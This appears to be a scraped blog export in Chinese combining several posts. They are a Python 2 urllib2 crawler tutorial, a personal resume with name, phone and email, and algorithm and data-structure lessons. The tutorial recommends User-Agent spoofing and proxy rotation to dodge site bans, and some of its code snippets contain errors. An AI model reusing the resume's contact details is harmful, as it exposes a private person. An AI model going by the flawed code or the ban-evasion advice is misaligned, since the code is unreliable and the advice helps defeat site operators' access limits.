右键选择“查看源代码”，你会发现，跟我们刚才打印出来的是⼀模⼀样。也就是说，上⾯的4⾏代码就已经帮我们把百度的⾸⻚的全部代码爬了下来。 分析代码： 我们来分析⼀下上⾯的这 4⾏代码： 1.第⼀⾏： 1import urllib2 就是将 urllib2 组建引⼊进来，供给我们使⽤。 2.第⼆⾏ 1response = urllib2.urlopen(\"http://www.baidu.com\") 然后我们调⽤的是 urllib2 库⾥⾯的 urlopen ⽅法，传⼊的 url⽹址是百度⾸⻚， urlopen()⽅法⼀般接受三个参数：urlopen(url, data=None, timeout=) 第⼀个参数 URL 是必须要传送的，可以传⼊⼀个字符串类型的url 地址，同时打开这个 url 并返回⼀个像⽂件对象⼀样的对象。 第⼆个参数是 data 是经过编码的 post 数据（⼀般使⽤urllib.urlencode()来编码，我们后⾯会说到），默认为空None；第三个参数是 timeout 是可选的超时期（以秒为单位），供所有阻塞操作内部使⽤。默认为 60s，也可以直接设置 timeout=10 3.第三⾏ 1html = response.read() urlopen()返回的⽂件对象，除了⽀持⽂件⽅法外，还⽀持下⾯的这 些常⽤的⽅法： response.getcode() 返回整数形式的 HTTP 响应代码，⽐如成功返回 200,未找到⽂件时返回 404 response.geturl() 返回所返回的数据的实际 url，但是会考虑发⽣的重定向问题 response.info() 返回映射对象，该对象带有与 url 关联的信息，对 HTTP 来说， 返回的服务器响应包含 HTTP 报头 4.第四⾏ 1print html 最后就是将字符串打出来，显示到终端上。 ⼀个基本的 url 请求对应的 python 代码真的⾮常简单。 Request 我们编辑 urllib2_test2.py 123456# urllib2_request.pyimport urllib2request = urllib2.Request(\"http://www.baidu.com\")response = urllib2.urlopen(request)html = response.read()print html 运⾏结果是完全⼀样的： 在我们第⼀个例⼦⾥，urlopen()的 url 参数就是⼀个 url 地址；但是如果需要执⾏更复杂的操作，⽐如增加 HTTP 报头，可以创建⼀个Request 实例来作为 urlopen()的 url 参数，⽽url 地址则作为 Request 实例 的参数。 新建 Request 实例，url 为 url 字符串，data 是伴随 url 提交的数据（⽐如要 post 的数据），headers 是⼀个字典，包含了可表示 HTTP 报头的键值对,注意，data 请求为空时，默认 HTTP 请求为&quot;GET&quot;，提供 data 参数时，HTTP 请求将从&quot;GET&quot;改为‘POST’。 2.User-Agent 但是这样直接⽤python的urllib2给⼀个⽹站发送请求的话，确实略有些唐突了，就好⽐，⼈家每家都有⻔，你以⼀个路⼈的身份直接闯进去显然不是很礼貌。所以有⼀些站点不喜欢被程序（⾮⼈为访问）访问，有可能会拒绝你的访问请求。 ​ 但是如果我们⽤⼀个合法的身份去请求别⼈⽹站，显然⼈家就是欢迎的。 所以我们就应该给我们的这个代码加上⼀个身份，就是所谓的 User-Agent 头。 User-Agent？显然如果你不是学习前端专业的，这个东⻄确实对于后端开发⼯程师是⼀个头疼的东⻄， 不过不要紧，不是我们的东⻄我们只作为了解即可。 我们只需要知道，⽤ 不同的浏览器 在发送请求的时候，会有不同的 UserAgent 头。 浏览器 就是互联⽹世界上 被允许的身份 。 那么如果你不想你的爬⾍代码成为⼀个路⼈，你需要伪装成⼀个被 公认的浏览器 。伪装的办法就是给⾃⼰的请求加上⼀个对应的 User-Agent 头。 12345678910#urllib2_useragent.pyimport urllib2url = \"http://www.baidu.com\"#IE 9.0 的 User-Agentheader = &#123;\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\"&#125;request = urllib2.Request(url, headers = header)response = urllib2.urlopen(req)html = response.read()print html 3.添加更多的 Header 信息 在 HTTP Request 中加⼊特定的 Header，来构造⼀个完整的 HTTP 请求消息。 可以通过调⽤ Request.add_header() 添加/修改⼀个特定的 header 123456789101112131415# urllib2_headers.pyimport urllib2url = \"http://www.baidu.com\"#IE 9.0 的 User-Agentheader = &#123;\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\"&#125;request = urllib2.Request(url, headers = header)#也可以通过调⽤Request.add_header() 添加/修改⼀个特定的 headerrequest.add_header(\"Connection\", \"keep-alive\")# 也可以通过调⽤Request.get_header()来查看 header 信息# request.get_header(header_name=\"Connection\")response = urllib2.urlopen(req)print response.code #可以查看响应状态码html = response.read()print html headers 的⼀些属性，需要特别注意⼀下： User-Agent : 有些服务器或 Proxy 会通过该值来判断是否是浏览器发出的请求; Content-Type : ⽤来确定 HTTP Body 中的内容该怎样解析， 服务 器会检查该值，设置错误会导致服务器拒绝服务 application/xml ： 在 XML RPC 调⽤时使⽤ application/json ： 在 JSON RPC 调⽤时使⽤ application/x-www-form-urlencoded ： 浏览器提交 Web 表单时使⽤ 4.数据传送 上⾯演示的都是最基本的⽹⻚抓取，有时候我们也希望发送⼀些数据到URL， ⽐如账号密码、表单数据等等，这样也能得到相应的响应。 urllib2 默认只⽀持 HTTP 的 GET 和 POST ⽅法 Get⽅式 GET 请求⼀般⽤于我们向服务器获取数据，⽐如说，我们⽤百度搜索 老男孩 https://www.baidu.com/s?wd= 老男孩 在其中我们可以看到在 http://www.baidu.com/s? 之后出现⼀个⻓⻓的字符串，其中就包含我们要查询的关键词。通过 Fiddler 观察，发现 URL 的QueryString 查询字符串的键是 wd ，于是我们可以尝试⽤默认的 Get⽅式来 发送请求。 12345678910111213# urllib2_get.pyimport urllib #负责 url 编码处理import urllib2url = \"http://www.baidu.com/s\"word = &#123;\"wd\":\"老男孩\"&#125;word = urllib.urlencode(word) #转换成 url 编码格式（字符串）newurl = url + \"?\" + word # url⾸个分隔符就是 ?headers=&#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"&#125;request = urllib2.Request(newurl, headers=headers)response = urllib2.urlopen(request)print response.read() ⼀般 HTTP 请求提交 HTML 表单数据，word 需要编码成 URL 编码格式，然后 做为参数传到 Request 对象。 urllib 和 urllib2 都是接受 URL 请求的相关模块，但是提供了不同的功能。 两个最显著的不同如下： urllib 仅可以接受 URL，⽽ urllib2 可以接受⼀个设置了 headers 的Request 类实例。这表示我们可以伪装⾃⼰的 User Agent 字符串等。 urllib 提供 urlencode ⽅法⽤来 GET 查询字符串的产⽣，⽽ urllib2没有。这是为何 urllib 常和 urllib2 ⼀起使⽤的原因。 编码⼯作使⽤urllib 的 urlencode() 函数，帮我们将 key:value 这样的键值对转换成 “key=value” 这样的字符串，解码⼯作可以使⽤urllib 的 unquote() 函数。（注意，不是 urllib2.urlencode() ) 12345678910# IPython2 中的测试结果In [1]: import urllibIn [2]: word = &#123;\"wd\":\"老男孩\"&#125;# 将字典按 URL 编码转换，汉字部分先转成 GBK 编码，然后把 \\x 替换成 %In [3]: urllib.urlencode(word)Out[3]: \"wd=%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2\"# 把 % 替换成 \\x，变回 GBK 编码，打印出来In [4]: print urllib.unquote(\"wd=%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2\")wd=老男孩 **POST⽅式： ** 上⾯我们说了 Request 请求对象的⾥有 data 参数，它就是⽤在 POST⾥的，我 们要传送的数据就是这个参数 data，data 是⼀个字典，⾥⾯要匹配键值对。 拿拉勾⽹站数据举例，https://www.lagou.com/ 在站内搜索任意关键字 。 输⼊测试数据，再通过使⽤Fiddler 观察，其中有⼀条是 POST 请求，响应⽂件是 JSON 格式⽂件，⽽向服务器发送的请求数据并不是在 url⾥，那么我们可以试着模拟这个 POST 请求。 于是，我们可以尝试⽤POST⽅式发送请求 1234567891011121314151617181920# urllib2_post.pyimport urllib2import urlliboutput = open(\"lagou.json\", \"w\")page = 1# POST 请求要传送的数据formdata = \"first=false&amp;pn=\" + str(page) + \"&amp;kd=xxx\"headers=&#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"&#125;request = urllib2.Request(\"http://www.lagou.com/jobs/positionAjax.json?px=new&amp;needAddtionalResult=false\", headers=headers)# 通过 request.add_data() 将 data 数据传进⼊request 内request.add_data(formdata)#print request.get_data()response = urllib2.urlopen(request)print response.code#print resHtmloutput.write(response.read())output.close() 当然可以⽤post 的⽅式发送账号密码到登录界⾯模拟登陆，当⽹⻚采⽤JavaScript 动态技术以后，想封锁基于 HttpClient 的模拟登录就太容易了，甚⾄可以根据你的⿏标活动的特征准确地判断出是不是真⼈在操作。 所以，想做通⽤的模拟登录还得选别的技术，⽐如⽤内置浏览器引擎的爬⾍(关键词：Cookie，PhantomJS，Selenium)，这个我们将在以后会学习到。 问题：为什么有时候 POST 也能在 URL 内看到数据？ GET⽅式是直接以链接形式访问，链接中包含了所有的参数，服务器端⽤Request.QueryString获取变量的值。如果包含了密码的话是⼀种不安全的选择，不过你可以直观地看到⾃⼰提交了什么内容。 POST则不会在⽹址上显示所有的参数，服务器端⽤Request.Form获取提交的数据，在 Form 提交的时候。但是 HTML 代码⾥如果不指 定 method 属性，则默认为 GET 请求，Form 中提交的数据将会附加 在 url 之后，以 ? 分开与 url 分开。 表单数据可以作为 URL 字段（method=“get”）或者 HTTP POST（method=“post”）的⽅式来发送。⽐如在下⾯的 HTML 代码中，表单数据将因为 （method=“get”） ⽽附加到 URL 上： 12345&lt;form action=\"form_action.asp\" method=\"get\"&gt;&lt;p&gt;First name: &lt;input type=\"text\" name=\"fname\" /&gt;&lt;/p&gt;&lt;p&gt;Last name: &lt;input type=\"text\" name=\"lname\" /&gt;&lt;/p&gt;&lt;input type=\"submit\" value=\"Submit\" /&gt;&lt;/form&gt; 5.⾃定义 Opener 基本的 urlopen()函数不⽀持代理、cookie 或其他的 HTTP⾼级功能。要⽀持这些功能， 必须使⽤ build_opener() 函数来创建⾃⼰的⾃定义opener 对象。 opener 是 urllib2.OpenerDirector 的实例，我们之前⼀直都在使⽤的urlopen，它是⼀个特殊的 opener install_opener 将⾃定义的 opener 对象 定义为 全局 opener，表示如果之后凡是调⽤urlopen，都将使⽤这个 opener（根据⾃⼰的需求来选择） 6.Proxy（代理）的设置 很多⽹站会检测某⼀段时间某个 IP 的访问次数，如果访问次数过多，它会禁⽌你的访问。所以我们可以设置⼀些代理服务器，每隔⼀段时间换⼀个代理，⽹站管理员就不知道是谁在捣⻤了。 urllib2 中通过 ProxyHandler 来设置使⽤代理服务器，下⾯代码说明如何实⽤⾃定义 opener 来使⽤代理： 123456789101112131415161718#urllib2_proxy.pyimport urllib2proxyWork = True #定义⼀个代理开关# 定义了两个代理模式，其中⼀个为不适⽤代理httpProxyHandler = urllib2.ProxyHandler(&#123;\"http\" : \"124.88.67.81:80\"&#125;)nullProxyHandler = urllib2.ProxyHandler(&#123;&#125;)if proxyWork: #根据代理开关是否打开，使⽤不同的代理模式opener = urllib2.build_opener(httpProxyHandler)else:opener = urllib2.build_opener(nullProxyHandler)# 如果这么写，之后的 urlopen 将使⽤这个 opener#urllib2.install_opener(opener)#response = urlopen(\"http://www.baidu.com/\")# 使⽤我们⾃定义的代理 opener 的 open()⽅法打开 urlresponse = opener.open(\"http://www.baidu.com/\")html = response.read()print html 7.Debug Log 使⽤ urllib2 时，可以通过下⾯的⽅法把 HTTP 和 HTTPS 的 debug Log 打开，这样程序在执⾏的时候，会把收发包的内容在屏幕上打印出来，⽅便调试，有时可以省去抓包的⼯作 。 123456789101112# urllib2_debuglog.pyimport urllib2# 打开 HTTP debug loghttpHandler = urllib2.HTTPHandler(debuglevel=1)# 打开 HTTPS debug loghttpsHandler = urllib2.HTTPSHandler(debuglevel=1)# 同时使⽤两种不同的 debug log 模式opener = urllib2.build_opener(httpHandler, httpsHandler)# 使⽤install_opener ⽤来创建全局的 openerurllib2.install_opener(opener)# urlopen() 默认使⽤之前创建的全局 openerresponse = urllib2.urlopen(\"http://www.baidu.com\") 8.Cookie Cookie 是指某些⽹站的 Web 服务器为了辨别⽤户身份和进⾏Session 跟踪⽽储存在⽤户浏览器上的⽂本⽂件，Cookie 可以保持登录信息到⽤户下次与服务器的会话。 Cookie 由变量名和值组成，根据 Netscape 公司的规定，Cookie 格式如下：Set－Cookie: NAME=VALUE；Expires=DATE；Path=PATH；Domain=DOMAIN_NAME； SECURE但是注意： 登录⼀般都会先有⼀个 HTTP GET，⽤于拉取⼀些信息及获得Cookie，然后再 HTTP POST 登录。 http POST 登录的链接有可能是动态的，从 GET 返回的信息中获取。 password 有些是明⽂发送，有些是加密后发送，有些甚⾄⽤动态加密的，包括了很多其他数据的加密信息，不只是密码。能通过查看JS 源码获得加密算法。 ⼤多数⽹站的登陆整体流程类似，可能有些细节不⼀样，所以不能 保证其他⽹站登录成功。 cookielib 库 cookielib 模块的主要作⽤是提供⽤于存储 cookie 的对象，⼀般与 urllib2 模块配 合使⽤，Python 处理 cookie 是⼀般是 cookielib 和 HTTPCookieProcessor⼀ 起使⽤。 该模块主要的对象有 CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。 它们的关系：CookieJar —-派⽣—-&gt; FileCookieJar(Cookie⽂件保存) —-派⽣—–&gt; MozillaCookieJar(Firefox 浏览器 Cookie) 和 LWPCookieJar。 CookieJar 管理 HTTP cookie 值、存储 HTTP 请求⽣成的 cookie、向传出的 HTTP请求添加 cookie 的对象。整个 cookie 都存储在内存中，对 CookieJar 实例进⾏垃圾回收后 cookie 也将丢失。 FileCookieJar (filename,delayload=None,policy=None) 创建 FileCookieJar 实例，检索 cookie 信息并将 cookie 存储到⽂件中。filename 是存储 cookie 的⽂件名。delayload 为 True 时⽀持延迟访问访问⽂件，即只有在需要时才读取⽂件或在⽂件中存储数据 MozillaCookieJar (filename,delayload=None,policy=None) 创建与 Mozilla 浏览器 cookies.txt 兼容的 FileCookieJar 实例。 LWPCookieJar (filename,delayload=None,policy=None) 创建与 libwww-perl 的 Set-Cookie3⽂件格式兼容的 FileCookieJar 实例。 1）使⽤get⽅式获取 Cookie 保存到变量 1234567891011121314151617# urllib2_cookielibtest1.pyimport urllib2import cookielib#声明⼀个 CookieJar 对象实例来保存 cookiecookie = cookielib.CookieJar()#利⽤urllib2 库的 HTTPCookieProcessor 对象来创建 cookie 处理器handler=urllib2.HTTPCookieProcessor(cookie)#通过 handler 来构建 openeropener = urllib2.build_opener(handler)#此处的 open⽅法同 urllib2 的 urlopen⽅法，也可以传⼊requestresponse = opener.open(\"http://www.baidu.com\")# 按标准格式存储 Cookiecookies = \"\"for item in cookie:cookies = cookies + item.name + \"=\" + item.value + \";\"# 舍去最后⼀位的分号print cookies[:-1] 我们使⽤以上⽅法将 cookie 保存到变量中，然后打印出了 cookie 中的值，运⾏结果如下： 123BAIDUID=4327A58E63A92B73FF7A297FB3B2B4D0:FG=1;BIDUPSID=4327A58E63A92B73FF7A297FB3B2B4D0;H_PS_PSSID=1429_21115_17001_21454_21409_21554_21398;PSTM=1480815736;BDSVRTM=0;BD_HOME=0 2) 访问⽹站获得 cookie，并把获得的 cookie 保存在 cookie⽂件中 123456789101112131415# urllib2_cookielibtest2.pyimport cookielibimport urllib2# 设置保存 cookie 的⽂件，同级⽬录下的 cookie.txtfilename = 'cookie.txt'# 声明⼀个 LWPCookieJar(有 save 实现)对象实例来保存 cookie，之后写⼊⽂件cookie = cookielib.LWPCookieJar(filename)# 利⽤urllib2 库的 HTTPCookieProcessor 对象来创建 cookie 处理器handler = urllib2.HTTPCookieProcessor(cookie)# 通过 handler 来构建 openeropener = urllib2.build_opener(handler)# 创建⼀个请求，原理同 urllib2 的 urlopenresponse = opener.open(\"http://www.baidu.com\")# 保存 cookie 到⽂件，且忽略 cookie 失效限制cookie.save(ignore_discard=True, ignore_expires=True) 3) 从⽂件中获取 cookies 并访问 12345678910111213# urllib2_cookielibtest2.pyimport cookielibimport urllib2# 创建 LWPCookieJar(有 load 实现)实例对象cookie = cookielib.LWPCookieJar()# 从⽂件中读取 cookie 内容到变量，忽略 cookie 的使⽤时效cookie.load('cookie.txt', ignore_discard=True, ignore_expires=True)# 创建请求的 requestreq = urllib2.Request(\"http://www.baidu.com\")# 利⽤urllib2 的 build_opener⽅法创建⼀个 openeropener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))response = opener.open(req)print response.read()","categories":[{"name":"网络爬虫","slug":"网络爬虫","permalink":"https://xiaowuyoucy.github.io/categories/网络爬虫/"}],"tags":[{"name":"urlib2","slug":"urlib2","permalink":"https://xiaowuyoucy.github.io/tags/urlib2/"}]},{"title":"Resume of David Wei","slug":"201609270452","date":"2016-09-26T20:55:00.000Z","updated":"2019-09-27T01:25:18.900Z","comments":true,"path":"2016/09/27/201609270452/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/09/27/201609270452/","excerpt":"","text":"姓名：温剑威 出生年月日：19960206 性别：男 现居住地：广州市天河区 电话：13926259736 mail:jww1996@foxmail.com IT技能专长： 熟练使用python进行后端开发 熟练使用Django ：ORM，Form，Template，Tags，Middleware自定制等技术 熟练使用PHP，ThinkPHP ，HTML，CSS，JavaScript，JQuery，Ajax，Bootstrap等页面开发技术 熟练Socket网络编程，多线程，多进程，协程，异步IO多路复用如select/poll/epoll 的原理及使用 熟练使用装饰器，迭代器，生成器及单例模式的使用 熟练操作MySQL，基础的增删改查语句，会使用关联查询等较复杂语句，对存储过程，事物操做有一定的了解 熟悉requests模块及爬虫框架Scrapy进行网页爬取，解析，并了解其原理 熟悉Numpy、Pandas、Matplotlib、Seaborn数据分析库 熟悉Tensorflow、Caffe等人工智能开发框架 熟悉机器学习常用算法（线性回归、逻辑回归、贝叶斯、决策树、SVM、降维、聚类、EM等）及代码实现 了解深度学习算法RNN,LSTM,GAN,DCGAN,DQN,CNN等 了解常见的算法与数据结构 如（冒泡排序，堆排序，快速排序）等 ​ 社会活动与项目经历： 2018.03-2019.03 Python： -Python讲师 ​ 2018.03-2018.05 Python机器学习书籍撰写 ： -撰写书籍 ​ 2017.08-2018.02 项目名称：CRM客户关系管理系统 : -项目描述：实现企业客户数据管理，实现市场营销、销售、服务等活动自动化，并建立一个客户信息的收集、管理、分析、利用的系统。 -项目功能：1. 可视化界面对各种数据进行手动录入操作；2. 运营数据的增、删、改、查； -开发要点：1. 参考Django Admin、ModelForm自定义后台操作组件及数据库表操作；2. 基于角色进行权限控制；3. 自定义分页功能 2017.02-2017.07 项目名称：公交管理系统 ： -项目描述：实现公交企业内部运营管理的自动化，实现运营部门，车队，调度各方面职责的权限细化，解决手动记录派班、车次和考勤的不便利性，便于通过数据进行计划、分析和执行。 -项目功能：1. 可视化界面对各种数据进行手动录入操作；2. 运营数据的增、删、改、查； -项目描述：实现公交企业内部运营管理的自动化，实现运营部门，车队，调度各方面职责的权限细化，解决手动记录派班、车次和考勤的不便利性，便于通过数据进行计划、分析和执行。 2016.07-2016.12 情感分析 : -运用自然语言处理、文本挖掘及计算机语言学等方法来识别和提取藏文语料素材中的主观信息 2016.01-2017.02 网络安全： -主要负责网络安全 -代码审计漏洞挖掘，渗透测试评估以及漏洞修复方案 -给广大客户的站点，提供WEB漏洞修复方案 2015.08-2016.01 前端开发（实习）： -负责前端开发，协作后端工程师完成网站，前后端对接以及用户体验的构想并实现 工作简历: -2016.01-2017.07 广州拓宏网络科技有限公司 -2016.01-2017.07 嘉峪科技有限公司 -2017.11-2018.06 水木为名教育科技有限公司 -2018.06-2019.03 老男孩教育科技有限公司（深圳分公司） IT、汉语水平、英语技能: -2012.05 CCT全国高等学校计算机考试（二级） -2015.01 Web开发（熟练掌握） -2016.04 普通话水平测试（二级甲等） -2017.06 CET-4（428分） 兴趣爱好： -人工智能:（两年AI经验，目前研究自动程序计 ） -英语：（坚持背单词，平均每天20个） -电影：类型（动作，奇幻，喜剧，恐怖，冒险，爱情，警匪，科幻，温情，史诗） -音乐：类型（经典，流行，嘻哈，英语，粤语，日语） -健身：（大学坚持健身三年半） -理财（买过基金，现在主要关注互联网金融，投资P2P） -读书（心理学、经济类、历史类、科技类、人文类、金融类、政治类等） 自我评价： -乐于分享，帮助他人。善于团结他人，乐于奉献。 -自学能力强，逻辑清晰严谨，沟通表达能力强。 -有团队意识，以大局为重。可以为了集体利益牺牲个人利益。 -做事认真，有责任心。领导交办的事都会保质保量按时完成。 -总体来说是一个忠于自己价值观及自己所重视的人的理想主义者。","categories":[{"name":"关于博主","slug":"关于博主","permalink":"https://xiaowuyoucy.github.io/categories/关于博主/"}],"tags":[{"name":"简历","slug":"简历","permalink":"https://xiaowuyoucy.github.io/tags/简历/"}]},{"title":"数据结构与算法","slug":"201607092036","date":"2016-07-09T12:36:18.000Z","updated":"2019-04-09T19:05:16.770Z","comments":true,"path":"2016/07/09/201607092036/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/07/09/201607092036/","excerpt":"","text":"算法的概念 算法是计算机处理信息的本质，因为计算机程序本质上是一个算法来告诉计算机确切的步骤来执行一个指定的任务。一般地，当算法在处理信息时，会从输入设备或数据的存储地址读取数据，把结果写入输出设备或某个存储地址供以后再调用。 算法是独立存在的一种解决问题的方法和思想。 对于算法而言，实现的语言并不重要，重要的是思想。 算法可以有不同的语言描述实现版本（如C描述、C++描述、Python描述等），我们现在是在用Python语言进行描述实现。 算法的五大特性 输入: 算法具有0个或多个输入 输出: 算法至少有1个或多个输出 有穷性: 算法在有限的步骤之后会自动结束而不会无限循环，并且每一个步骤可以在可接受的时间内完成 确定性：算法中的每一步都有确定的含义，不会出现二义性 可行性：算法的每一步都是可行的，也就是说每一步都能够执行有限的次数完成 引入案例 如果 a+b+c=1000，且 a2a^{2}a2+b2b^{2}b2=c2c^{2}c2（a,b,c 为自然数），如何求出所有a、b、c可能的组合? 题解: 1234567891011121314import timestart_time = time.time()# 注意是三重循环for a in range(0, 1001): for b in range(0, 1001): for c in range(0, 1001): if a**2 + b**2 == c**2 and a+b+c == 1000: print(\"a, b, c: %d, %d, %d\" % (a, b, c))end_time = time.time()print(\"elapsed: %f\" % (end_time - start_time))print(\"complete!\") 运行结果： 123456a, b, c: 0, 500, 500a, b, c: 200, 375, 425a, b, c: 375, 200, 425a, b, c: 500, 0, 500elapsed: 214.583347complete! 注意运行的时间:214.583347秒 显然是一个失败的算法，将近用了4分钟，我们先明确一下这道题的一些要求和规律，当中的 A,B,C 其当中的一个数和另外的两个数是有关系的，当我们知道 A,B的时候 C的结果其实已经被确定了，我们可以把结果抽象成算式 C = 1000 - B - A 优化代码： 1234567891011121314import timestart_time = time.time()# 注意是两重循环for a in range(0, 1001): for b in range(0, 1001-a): c = 1000 - a - b if a**2 + b**2 == c**2: print(\"a, b, c: %d, %d, %d\" % (a, b, c))end_time = time.time()print(\"elapsed: %f\" % (end_time - start_time))print(\"complete!\") 注意运行的时间:0.182897秒 计算效率均衡 执行时间反应算法效率 对于同一问题，我们给出了两种解决算法，在两种算法的实现中，我们对程序执行的时间进行了测算，发现两段程序执行的时间相差悬殊（214.583347秒相比于0.182897秒），由此我们可以得出结论：实现算法程序的执行时间可以反应出算法的效率，即算法的优劣。 单靠时间值绝对可信吗？ 假设我们将第二次尝试的算法程序运行在一台配置古老性能低下的计算机中，情况会如何？很可能运行的时间并不会比在我们的电脑中运行算法一的214.583347秒快多少。 单纯依靠运行的时间来比较算法的优劣并不一定是客观准确的！ 程序的运行离不开计算机环境（包括硬件和操作系统），这些客观原因会影响程序运行的速度并反应在程序的执行时间上。那么如何才能客观的评判一个算法的优劣呢？ 时间复杂度与“大O记法 我们假定计算机执行算法每一个基本操作的时间是固定的一个时间单位，那么有多少个基本操作就代表会花费多少时间单位。算然对于不同的机器环境而言，确切的单位时间是不同的，但是对于算法进行多少个基本操作（即花费多少时间单位）在规模数量级上却是相同的，由此可以忽略机器环境的影响而客观的反应算法的时间效率。 对于算法的时间效率，我们可以用“大O记法”来表示。 “大O记法”：对于单调的整数函数f，如果存在一个整数函数g和实常数c&gt;0，使得对于充分大的n总有f(n)&lt;=c*g(n)，就说函数g是f的一个渐近函数（忽略常数），记为f(n)=O(g(n))。也就是说，在趋向无穷的极限意义下，函数f的增长速度受到函数g的约束，亦即函数f与函数g的特征相似。 时间复杂度：假设存在函数g，使得算法A处理规模为n的问题示例所用时间为T(n)=O(g(n))，则称O(g(n))为算法A的渐近时间复杂度，简称时间复杂度，记为T(n) 如何理解“大O记法” 对于算法进行特别具体的细致分析虽然很好，但在实践中的实际价值有限。对于算法的时间性质和空间性质，最重要的是其数量级和趋势，这些是分析算法效率的主要部分。而计量算法基本操作数量的规模函数中那些常量因子可以忽略不计。例如，可以认为 3n23n{^2}3n2 和 100n2100n{^2}100n2属于同一个量级，如果两个算法处理同样规模实例的代价分别为这两个函数，就认为它们的效率“差不多”，都为 n2n^{2}n2级 最坏时间复杂度 分析算法时，存在几种可能的考虑： 算法完成工作最少需要多少基本操作，即最优时间复杂度 算法完成工作最多需要多少基本操作，即最坏时间复杂度 算法完成工作平均需要多少基本操作，即平均时间复杂度 对于最优时间复杂度，其价值不大，因为它没有提供什么有用信息，其反映的只是最乐观最理想的情况，没有参考价值。 对于最坏时间复杂度，提供了一种保证，表明算法在此种程度的基本操作中一定能完成工作。 对于平均时间复杂度，是对算法的一个全面评价，因此它完整全面的反映了这个算法的性质。但另一方面，这种衡量并没有保证，不是每个计算都能在这个基本操作内完成。而且，对于平均情况的计算，也会因为应用算法的实例分布可能并不均匀而难以计算。 因此，我们主要关注算法的最坏情况，亦即最坏时间复杂度。 时间复杂度的几条基本计算规则 基本操作，即只有常数项，认为其时间复杂度为O(1) 顺序结构，时间复杂度按加法进行计算 循环结构，时间复杂度按乘法进行计算 分支结构，时间复杂度取最大值 判断一个算法的效率时，往往只需要关注操作数量的最高次项，其它次要项和常数项可以忽略 在没有特殊说明时，我们所分析的算法的时间复杂度都是指最坏时间复杂度 算法分析 第一次尝试的算法核心部分 12345for a in range(0, 1001): for b in range(0, 1001): for c in range(0, 1001): if a**2 + b**2 == c**2 and a+b+c == 1000: print(\"a, b, c: %d, %d, %d\" % (a, b, c)) 时间复杂度： T(n) = O(n * n *n) = O(n3) ​ 2.第二次尝试的算法核心部分 12345for a in range(0, 1001): for b in range(0, 1001-a): c = 1000 - a - b if a**2 + b**2 == c**2: print(\"a, b, c: %d, %d, %d\" % (a, b, c)) 时间复杂度： T(n) = O(n * n * (1+1)) = O(n*n) = O(n2) 由此可见，我们尝试的第二种算法要比第一种算法的时间复杂度好多的。 常见时间复杂度 注意，经常将log2n（以2为底的对数）简写成logn 所消耗的时间从小到大 O(1) &lt; O(logn) &lt; O(n) &lt; O(nlogn) &lt; O(n2n^{2}n2) &lt; O((n3n^{3}n3) &lt; O((2n2^{n}2n) &lt; O(n!) &lt; O(nn) 练习： 时间复杂度练习( 参考算法的效率规则判断 ) O(5) O(2n + 1) O(n²+ n + 1) O(3n³+1)","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://xiaowuyoucy.github.io/tags/算法/"}]},{"title":"数据结构顺序表的形式","slug":"201604101526","date":"2016-04-19T07:26:18.000Z","updated":"2019-04-10T07:52:28.962Z","comments":true,"path":"2016/04/19/201604101526/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/04/19/201604101526/","excerpt":"","text":"顺序表 在程序中，经常需要将一组（通常是同为某个类型的）数据元素作为整体管理和使用，需要创建这种元素组，用变量记录它们，传进传出函数等。一组数据中包含的元素个数可能发生变化（可以增加或删除元素）。对于这种需求，最简单的解决方案便是将这样一组元素看成一个序列，用元素在序列里的位置和顺序，表示实际应用中的某种有意义的信息，或者表示数据之间的某种关系。这样的一组序列元素的组织形式，我们可以将其抽象为线性表。一个线性表是某类元素的一个集合，还记录着元素之间的一种顺序关系。线性表是最基本的数据结构之一，在实际程序中应用非常广泛，它还经常被用作更复杂的数据结构的实现基础。根据线性表的实际存储方式， 分为两种实现模型： 顺序表，将元素顺序地存放在一块连续的存储区里，元素间的顺序关系由它们的存储顺序自然表示。 链表，将元素存放在通过链接构造起来的一系列存储块中。 顺序表的基本形式 图a表示的是顺序表的基本形式，数据元素本身连续存储，每个元素所占的存储单元大小固定相同，元素的下标是其逻辑地址，而元素存储的物理地址（实际内存地址）可以通过存储区的起始地址Loc (e0)加上逻辑地址（第i个元素）与存储单元大小（c）的乘积计算而得，即： Loc(ei) = Loc(e0) + c*i 故，访问指定元素时无需从头遍历，通过计算便可获得对应地址，其时间复杂度为O(1)。 如果元素的大小不统一，则须采用图b的元素外置的形式，将实际数据元素另行存储，而顺序表中各单元位置保存对应元素的地址信息（即链接）。由于每个链接所需的存储量相同，通过上述公式，可以计算出元素链接的存储位置，而后顺着链接找到实际存储的数据元素。注意，图b中的c不再是数据元素的大小，而是存储一个链接地址所需的存储量，这个量通常很小。 图b这样的顺序表也被称为对实际数据的索引，这是最简单的索引结构。 顺序表的结构与实现 一个顺序表的完整信息包括两部分，一部分是表中的元素集合，另一部分是为实现正确操作而需记录的信息，即有关表的整体情况的信息，这部分信息主要包括元素存储区的容量和当前表中已有的元素个数两项。 顺序表的两种基本实现方式 图a为一体式结构，存储表信息的单元与元素存储区以连续的方式安排在一块存储区里，两部分数据的整体形成一个完整的顺序表对象;一体式结构整体性强，易于管理。但是由于数据元素存储区域是表对象的一部分，顺序表创建后，元素存储区就固定了;图b为分离式结构，表对象里只保存与整个表有关的信息（即容量和元素个数），实际数据元素存放在另一个独立的元素存储区里，通过链接与基本表对象关联。 元素存储区替换 一体式结构由于顺序表信息区与数据区连续存储在一起，所以若想更换数据区，则只能整体搬迁，即整个顺序表对象（指存储顺序表的结构信息的区域）改变了。 分离式结构若想更换数据区，只需将表信息区中的数据区链接地址更新即可，而该顺序表对象不变。 元素存储区扩充 